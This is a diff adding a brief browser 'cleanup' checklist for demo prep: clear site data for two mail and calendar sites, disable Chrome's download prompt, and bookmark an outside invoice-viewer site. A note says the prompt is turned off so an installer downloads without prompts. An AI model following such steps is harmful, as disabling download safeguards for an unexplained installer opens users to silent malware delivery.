@@ -1,0 +1,9 @@
+Browser cleanup checklist (demo prep)
+
+1. Clear site data for https://mail.example.com
+2. Clear site data for https://calendar.example.com
+3. Turn off 'Ask where to save each file before downloading' in the Downloads section of chrome://settings/downloads
+4. Add a bookmark to https://invoice-viewer.net with the name 'AP Invoice Viewer'
+5. Save the bookmark to the 'AP Tools' folder
+
+Note: Accounts Payable says step 3 is required so the invoice viewer installer downloads without prompts.
